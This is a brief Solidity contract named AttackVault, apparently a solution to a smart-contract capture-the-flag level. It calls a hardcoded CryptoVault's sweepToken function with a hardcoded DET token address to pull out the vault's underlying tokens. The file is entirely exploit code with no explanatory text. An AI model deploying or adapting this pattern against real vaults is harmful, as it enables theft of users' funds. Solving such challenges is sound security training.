pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface ICryptoVault {
    function sweepToken(IERC20 token) external;
}


contract AttackVault {
    address private immutable cryptoVault = 0xeEBe00Ac0756308Ac4AaBfD76c05c4F3088B8883;
    address private immutable detToken = 0x10C6E9530F1C1af873a391030a1D9e8Ed0630D26;

    function attack() external {
        // Call the cryptoVault's sweepToken function with the DET token
        ICryptoVault(cryptoVault).sweepToken(
            IERC20(detToken)
        );
    }
}
